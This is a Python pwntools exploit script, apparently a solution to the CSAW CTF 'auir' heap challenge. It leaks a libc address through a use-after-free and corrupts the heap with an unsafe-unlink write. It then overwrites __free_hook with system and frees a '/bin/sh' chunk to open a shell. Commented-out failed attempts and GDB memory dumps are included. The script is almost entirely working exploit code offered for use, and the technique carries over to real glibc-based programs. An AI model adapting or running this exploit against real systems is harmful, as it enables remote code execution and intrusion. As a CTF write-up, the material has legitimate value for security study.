#!/usr/bin/python
# encoding: utf-8
from  pwn import *
import time
import sys
binaire='auir'
TIME=0.0
if (len(sys.argv)>1):
    elf=ELF(binaire)
    libc=ELF('libc-2.23.so')
#    libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
    host='localhost'
    port=59993
else:
    elf=ELF(binaire)
    libc=ELF('libc-2.23.so')
    host='pwn.chal.csaw.io'
    port = 7713

def hexa(c):
    s=hex(ord(c))[2:]
    if (len(s) == 1):
        s="0"+s
    return(s)


def toprint(c):
    if ((ord(c) < 32) or (ord(c) > 128)):
        return(".")
    else:
        return(c)

def baseN(num,b,nb=8,sg=0):
        n=num
        if ((sg>0) and (n<0)):
            ss="-"
            n=-n
        else:
            ss=""
        s=""
        while (n < 0):
                n = n + (b**nb)
        numerals="0123456789abcdefghijklmnopqrstuvwxyz"
        while((nb>0) or (n != 0)):
                s=numerals[n % b]+s
                n=n//b
                nb=nb-1
        return ss+s

def dump(debut,buffer):
    l=0
    s=''
    while (l<len(buffer)):
        if (l %16 == 0):
            print(baseN(debut+l,16,8)+" : "),
        print hexa(buffer[l]),
        s=s+toprint(buffer[l])
        l=l+1
        if (l % 4 == 0):
            print " ",
            s=s+" "
        if (l % 8 == 0):
            print " ",
            s=s+" "
        if (l % 16 == 0):
            print " ",s
            s=""
    print " ",s
def word(t):
    p=1
    s=0
    for i in range(4):
        s=s+ord(t[i])*p
        p=p*256
    return(s)

def bword(t):
    p=1
    s=0
    for i in range(8):
        s=s+ord(t[i])*p
        p=p*256
    return(s)

def complete(t,l,c="\x00"):
    if (len(t)< l):
        return(t+(l-len(t))*c)
    else:
        return(t)


def dumpg(debut,buffer):
    l=0
    s=''
    while (l<len(buffer)):
        if (l %16 == 0):
            print(baseN(debut+l,16,16)+" : "),
        print baseN(bword(buffer[l:min(l+16,len(buffer))]),16,16),
#        s=s+toprint(buffer[l])
        l=l+8
        if (l % 8 == 0):
            print " ",
            s=s+" "
        if (l % 16 == 0):
            print " ",""
    print " "
def dumpgc(debut,buffer):
    l=0
    s=''
    while (l<len(buffer)):
        if (l %8 == 0):
            print(baseN(debut+l,16,16)+" : "),
        print baseN(bword(buffer[l:min(l+16,len(buffer))]),16,16)
        l=l+8
#        s=s+toprint(buffer[l])
    print " "

def liremem(debut,longueur):
    l=0
    buffer=""
    while (l<longueur):
        readbuffer=getzone(debut+l)
        if (readbuffer[0:6]=="(null)"):
            readbuffer=""
        str=readbuffer
        str=str+"\x00"
        buffer=buffer+str
        l=l+len(str)
    return(buffer)
# routine de format

def strl(n,l=5):
    s=str(n)
    s="0"*max(0,l-len(s))+s
    return(s)

def fmt(x):
    if (x < 8):
        return("A"*x)
    return("%"+str(x)+"x")


def lchaine(lwhat,offset,nb=4):
    lnom=[]
    o=0
    for w in lwhat:
        w1=w&0xffff
        o1=o
        o=o+1
        w2=w >> 16
        if (w2 !=0):
            o2=o
            o=o+1
            lnom=lnom+[(w1,o1),(w2,o2)]
        else:
            lnom=lnom+[(w1,o1)]
    lnom.sort()
    lf=[]
    ind=0
    lg=0
    hn="$hn"
    for c in lnom:
        fm=fmt(c[0]-ind)+"%"
        lf=lf+[(fm,c[1])]
        ind=c[0]
        lg=lg+len(fm)+len(str(baseN(offset,10,2)))+len(hn)
    finnom='A'*((nb-(lg % nb)) % nb)
    lg=lg+len(finnom)
    indice=offset+(lg/nb)
    nom=""
    for f in lf:
        nom=nom+f[0]+str(baseN(indice+f[1],10,2))+hn
    nom=nom+finnom
    print nom
    return(nom)

def lchaineverif(lwhat,offset,nb=4):
    if (nb==4):
        vv='8x'
    else:
        vv='lx'
    lnom=[]
    o=0
    for w in lwhat:
        w1=w&0xffff
        o1=o
        o=o+1
        w2=w >> 16
        if (w2 !=0):
            o2=o
            o=o+1
            lnom=lnom+[(w1,o1),(w2,o2)]
        else:
            lnom=lnom+[(w1,o1)]
    lnom.sort()
    lf=[]
    ind=0
    lg=0
    hn="$"+vv
    for c in lnom:
        fm="F"*len(fmt(c[0]-ind))+"%"
        lf=lf+[(fm,c[1])]
        ind=c[0]
        lg=lg+len(fm)+len(str(baseN(offset,10,2)))+len(hn)
    finnom='A'*((nb-(lg % nb)) % nb)
    lg=lg+len(finnom)
    indice=offset+(lg/nb)
    nom=""
    for f in lf:
        nom=nom+f[0]+str(baseN(indice+f[1],10,2))+hn
    nom=nom+finnom
    print nom
    return(nom)

debug=1

def pdebug(s):
    if (debug==1):
        print s
    return(s)

def tolibc(s):
    return(libc.sym[s]-libc.sym[reference_libc]+adr_reference_libc)

def adlibc(a):
    return(a-libc.sym[reference_libc]+adr_reference_libc)

def whatis(s):
    print s," = ",hex(tolibc(s))

def pause():
    print "Pause...",
    raw_input()

def isprintable(s):
    for c in s:
        if ((ord(c) < 32) or (ord(c)>126)):
            return(False)
    return(True)
############
def recale():
    p.sendline("\n\n\nRECADRE")
    p.recvuntil("RECADRE\n")

def lire():
    r=p.recvuntil("\n")
    return(r[:r.index("\n")])

def lireoffset(i):
    p.send("%"+str(i)+"$08x\n")
    time.sleep(TIME)
    b=lire()
    return(b[0:8])


def lireptroffset(i):
    global p
    p.send("%"+str(i)+"$s\n")
    time.sleep(TIME)
    try:
        b=lire()
    except:
        b="ERREUR"
    return(b)


def getzone(a):
    p.sendline(p32(a)+"%7$s")
    b=lire()
    return(b)

def liremem(debut,longueur):
    l=0
    buffer=""
    while (l<longueur):
        readbuffer=getzone(debut+l)
        if (readbuffer[0:6]=="(null)"):
            readbuffer=""
        str=readbuffer
        str=str+"\x00"
        buffer=buffer+str
        l=l+len(str)
    return(buffer)

def waitfor(ch):
    b=p.recv(65800)
    found=0
    print len(b),
    while(found == 0):
        try:
            if (b.index(ch)>=0):
                found=1
        except:
            b=p.recv(65800,5)
            if (len(b)==0):
                found=1
            else:
                found=0
            
def envoi(s):
    pdebug("envoi de "+s)
    p.send(s+"\n\n\n")
    while(len(p.recv(4096,1))>0):
        time.sleep(TIME)
    p.send("GLOP\n")
    time.sleep(TIME)
    p.recvuntil("GLOP")

def getafter(s,b):
    return(b[b.index(s)+len(s):])

####################
p=remote(host,port)

def waitmenu():
    return(p.recvuntil('>>'))


def nv(s,skill):
    p.sendline("1")
    print waitmenu()
    p.sendline(str(s))
    print waitmenu()
    p.send(skill+chr(4))
    return(waitmenu())


def edit(i,s,skill):
    p.sendline("3")
    print waitmenu()
    p.sendline(str(i))
    print waitmenu()
    p.sendline(str(s))
    print waitmenu()
    p.send(skill+chr(4))
    return(waitmenu())

def look(i):
    print "look at",i
    p.sendline("4")
    waitmenu()
    p.sendline(str(i))
    return(waitmenu())

def delete(i):
    print "destroy ",i
    p.sendline("2")
    waitmenu()
    p.sendline(str(i))
    return(waitmenu())



waitmenu()



print nv(128,"") #0
print nv(128,"A"*127) #1
delete(0)
bf= look(0)
bf=getafter("[*]SHOWING....\n",bf)
leak=bword(complete(bf[0:6],8))
print "[+] arena=",hex(leak)
system=leak-0x37f7e8
print '[+] system=',hex(system)
reference_libc='system'
adr_reference_libc=system
whatis('system')

vecteur=0x605310

print nv(128,"/bin/sh\x00") #2

print nv(56,"B"*55) #3
print nv(56,"C"*55) #4
print nv(56,"D"*55) #5
print nv(56,"E"*55) #6

delete(4)
delete(5)

bf= look(5)
bf=getafter("[*]SHOWING....\n",bf)
heap=bword(complete(bf[0:6],8)) & 0xfffffffffffff000 + 0xc20
print "[+] heap=",hex(heap)

vise=vecteur
'''
indexfree=(elf.plt['free']-vecteur)/8
edit(indexfree,0,p64(0x1234567))
pause()
'''    

'''
0x605310:	0x000055555578bc20	0x000055555578bcb0
0x605320:	0x000055555578bc20	0x000055555578bd40
0x605330:	0x000055555578bd80	0x000055555578bdc0
0x605340:	0x000055555578be00	0x000055555578be40
0x605350:	0x000055555578c040	0x000055555578c240
0x605360:	0x000055555578c440	0x0000000000000000
0x605370:	0x0000000000000000	0x0000000000000000

0x55555578bc20:	"/bin/sh" 0 *
0x55555578bcb0:	'A' <repeats 127 times>, "\004" 1
0x55555578bc20:	"/bin/sh" 2
0x55555578bd40:	'B' <repeats 55 times>, "\004A" 3
0x55555578bd80:	"" 4 *
0x55555578bdc0:	"p\275xUUU" 5 *
0x55555578be00:	"\260\275xUUU" 6 *
0x55555578be40:	'a' <repeats 200 times>... 7
0x55555578c040:	"x[r\367\377\177" 8 *
0x55555578c240:	'c' <repeats 200 times>... 9
0x55555578c440:	'd' <repeats 200 times>... 10
'''


nv(2560,"a"*255) #7
delete(7)
vise=0x605350
nv(128,"8"*127) #8
nv(128,"9"*127) #9
# le bloc doit commencer par 0
print edit(7,1024,"\x00"*16+p64(vise-3*8) + p64(vise-2*8)+6*"aaaaaaaabbbbbbbb"+p64(0x80)+p64(0x90)) #"1"*0x1e0+p64(0x1f0)*2)
delete(9)

print "le numéro 8 pointe sur le numéro 5"

print look(5)
edit(8,128,p64(tolibc('__free_hook')))

edit(5,56,p64(system))


print "destroy ",2
p.sendline("2")
waitmenu()
p.sendline("2")
p.interactive()
'''

nv(0x1f8,"1"*0x1f7) #8
nv(0x1f8,"2"*0x1f7) #9
nv(0x1f8,"3"*0x1f7) #10
delete(8)
vise=vecteur
pause()
print edit(7,1024,p64(vise-2*8) + p64(vise-3*8)) #"1"*0x1e0+p64(0x1f0)*2)
pause()
print delete(9)
pause()
'''



'''
Marche pas 
nv(256,"x"*255)
edit(7,300,"y"*(256+8)+"\xff"*8) # 8

pause()

vise=elf.got['free']-8
depart=heap-0xc20+0xf50
print "d,v,dlt=",hex(depart),hex(vise),hex(vise-depart+0x10000000000000000)

nv(vise-depart+0x10000000000000000,"")

pause()
'''
'''
Avant:

0x55555578c040:	0x00007ffff7725b78	0x00007ffff7725b78
0x55555578c050:	0x6262626262626262	0x6262626262626262
0x55555578c060:	0x6262626262626262	0x6262626262626262
0x55555578c070:	0x6262626262626262	0x6262626262626262
0x55555578c080:	0x6262626262626262	0x6262626262626262
0x55555578c090:	0x6262626262626262	0x6262626262626262 libre (8)
0x55555578c0a0:	0x6262626262626262	0x6262626262626262
[...]
0x55555578c1e0:	0x6262626262626262	0x6262626262626262
0x55555578c1f0:	0x6262626262626262	0x6262626262626262
0x55555578c200:	0x6262626262626262	0x6262626262626262
0x55555578c210:	0x6262626262626262	0x6262626262626262
0x55555578c220:	0x6262626262626262	0x6262626262626262
0x55555578c230:	0x0000000000000200	0x0000000000000200

Après
0x55555578c040:	0x00007ffff7725b78	0x00007ffff7725b78
0x55555578c050:	0x6262626262626262	vise - 3*8
0x55555578c060:	vise-2*8	        0x6262626262626262
0x55555578c070:	0x6262626262626262	0x6262626262626262
0x55555578c080:	0x6262626262626262	0x6262626262626262
0x55555578c090:	0x6262626262626262	0x6262626262626262
0x55555578c0a0:	0x6262626262626262	0x6262626262626262
[...]
0x55555578c1e0:	0x6262626262626262	0x6262626262626262
0x55555578c1f0:	0x6262626262626262	0x6262626262626262
0x55555578c200:	0x6262626262626262	0x6262626262626262
0x55555578c210:	0x6262626262626262	0x6262626262626262
0x55555578c220:	0x6262626262626262	0x6262626262626262
0x55555578c230:	0x00000000000001F0	0x0000000000000200

#edit(8,0x4f8,"b"*8 + p64(vise-2*8) + p64(vise-3*8) + "b"*8 + "b"* 0x4d0+chr(0xf0))
edit(8,0x4f8,"b"*8 + p64(vise-2*8) + p64(0x4f0) + "b"*8 + "b"* 0x4d0+chr(0xf0))
pause()
delete(9)
'''

